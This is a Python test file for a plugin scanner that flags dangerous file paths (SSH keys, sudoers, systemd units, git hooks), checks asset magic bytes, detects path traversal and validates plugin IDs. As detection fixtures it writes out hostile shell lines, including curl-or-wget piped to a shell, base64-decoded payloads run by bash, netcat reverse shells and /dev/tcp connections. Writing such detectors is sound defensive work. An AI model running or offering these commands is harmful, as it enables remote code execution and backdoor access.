import pytest

from omdall import patterns


@pytest.mark.parametrize(
    "path",
    [
        ".git/config",
        "sub/.git/hooks/pre-commit",
        ".ssh/authorized_keys",
        "home/.ssh/id_ed25519",
        "authorized_keys",
        "etc/sudoers",
        "evil.service",
        "x.timer",
        "x.socket",
        "x.path",
        "launcher.desktop",
        "cert.pem",
        "id.key",
        "bundle.p12",
        "systemd/user/thing",
        ".config/omarchy/hooks/post-update",
    ],
)
def test_denied_paths(path: str) -> None:
    assert patterns.is_denied(path)
    hard = (".git/", ".ssh/", "authorized_keys", "sudoers")
    assert patterns.is_hard_path(path) == any(h in path for h in hard)


@pytest.mark.parametrize(
    "path",
    ["Widget.qml", "gitignore.md", "my.git.qml", "services/Foo.qml", "keys.qml", "docs/path.md"],
)
def test_allowed_paths(path: str) -> None:
    assert not patterns.is_denied(path)
    assert not patterns.is_hard_path(path)


@pytest.mark.parametrize("path", ["sudoers.qml", "authorized_keys.md", "x.ssh/y", "git/config"])
def test_not_hard_paths(path: str) -> None:
    assert not patterns.is_hard_path(path)


@pytest.mark.parametrize(
    "line",
    [
        "curl https://evil.invalid/x | sh",
        "wget -qO- http://x | bash",
        "curl -fsSL x |zsh -s",
        "echo aGk= | base64 -d | sh",
        "base64 --decode payload | bash",
        "nc 10.0.0.1 4444 -e /bin/sh",
        "ncat host 1 -ve bash",
        "exec 3<>/dev/tcp/1.2.3.4/80",
        "cat x | sudo tee /etc/x",
        "echo | pkexec cp a b",
        "CURL http://x | SH",
    ],
)
def test_danger_lines(line: str) -> None:
    assert patterns.DANGER_LINE.search(line)


@pytest.mark.parametrize(
    "line",
    [
        "curl https://example.com -o file",
        "const shell = 'bash'",
        "base64 -d file > out",
        "sudo systemctl restart foo",
        "// pipe | shell",
    ],
)
def test_harmless_lines(line: str) -> None:
    assert not patterns.DANGER_LINE.search(line)


@pytest.mark.parametrize(
    ("path", "asset"),
    [("icon.PNG", True), ("font.woff2", True), ("a.jpeg", True), ("payload.bin", False)],
)
def test_assets(path: str, asset: bool) -> None:
    assert patterns.is_known_asset(path) is asset


@pytest.mark.parametrize(
    ("path", "code"),
    [
        ("Widget.qml", True),
        ("lib/util.MJS", True),
        ("run.sh", True),
        ("manifest.json", True),
        ("units/x.service", True),
        ("qmldir", True),
        ("sub/qmldir", True),
        ("icon.png", False),
        ("payload.bin", False),
        ("qmldir.txt", False),
        ("notes.qml.png", False),
    ],
)
def test_code_paths(path: str, code: bool) -> None:
    assert patterns.is_code_path(path) is code


@pytest.mark.parametrize(
    ("path", "native"),
    [
        ("libfoo.so", True),
        ("lib/libfoo.so.6.2", True),
        ("addon.node", True),
        ("x.DLL", True),
        ("x.dylib", True),
        ("sound.ogg", False),
        ("so.qml", False),
        ("libfoo.so.txt", False),
        ("x.nodes", False),
    ],
)
def test_native_paths(path: str, native: bool) -> None:
    assert patterns.is_native_path(path) is native


@pytest.mark.parametrize(
    ("path", "head"),
    [
        ("a.png", b"\x89PNG\r\n\x1a\n\x00\x00"),
        ("a.JPG", b"\xff\xd8\xff\xe0"),
        ("a.jpeg", b"\xff\xd8\xff\xdb"),
        ("a.gif", b"GIF87a\x01\x00"),
        ("a.gif", b"GIF89a\x01\x00"),
        ("a.webp", b"RIFF\x24\x00\x00\x00WEBPVP8 "),
        ("a.ico", b"\x00\x00\x01\x00\x01\x00"),
        ("a.avif", b"\x00\x00\x00\x1cftypavif"),
        ("a.avif", b"\x00\x00\x00\x1cftypavis"),
        ("a.bmp", b"BM\x36\x00"),
        ("a.woff", b"wOFF\x00\x01"),
        ("a.woff2", b"wOF2\x00\x01"),
        ("a.ttf", b"\x00\x01\x00\x00\x00\x10"),
        ("a.ttf", b"true\x00\x10"),
        ("a.ttf", b"OTTO\x00\x10"),
    ],
)
def test_asset_matches(path: str, head: bytes) -> None:
    assert patterns.asset_matches(path, head)


@pytest.mark.parametrize(
    ("path", "head"),
    [
        ("a.png", b"\x7fELF\x02\x01\x01\x00"),
        ("a.png", b"GIF89a\x01\x00"),
        ("a.jpg", b"\xff\xd8\x00"),
        ("a.gif", b"GIF88a"),
        ("a.webp", b"RIFF\x24\x00\x00\x00WAVEfmt "),
        ("a.ico", b"\x00\x00\x02\x00"),
        ("a.avif", b"\x00\x00\x00\x1cftypheic"),
        ("a.bmp", b"MB"),
        ("a.woff", b"wOF2"),
        ("a.woff2", b"wOFF"),
        ("a.ttf", b"ttcf"),
        ("a.png", b""),
        ("payload.bin", b"\x89PNG\r\n\x1a\n"),
    ],
)
def test_asset_mismatches(path: str, head: bytes) -> None:
    assert not patterns.asset_matches(path, head)


@pytest.mark.parametrize(
    ("ep", "escapes"),
    [
        ("/etc/passwd", True),
        ("../outside.qml", True),
        ("a/../../b.qml", True),
        ("a/..", True),
        ("foo..qml", False),
        ("sub/Widget.qml", False),
        ("..hidden/x.qml", False),
    ],
)
def test_entry_point_escape(ep: str, escapes: bool) -> None:
    assert patterns.escapes_plugin(ep) is escapes


@pytest.mark.parametrize(
    ("value", "valid"),
    [
        ("selftest.demo", True),
        ("my-plugin_2", True),
        ("A", True),
        ("omarchyish.x", True),
        ("", False),
        ("../x", False),
        ("a..b", False),
        ("/etc", False),
        ("sub/dir", False),
        (".hidden", False),
        ("-flag", False),
        ("omarchy.core", False),
        ("demo\n", False),
        ("caf\u00e9", False),
        ("with space", False),
        (None, False),
        (7, False),
        (["selftest.demo"], False),
    ],
)
def test_valid_plugin_id(value: object, valid: bool) -> None:
    assert patterns.valid_plugin_id(value) is valid
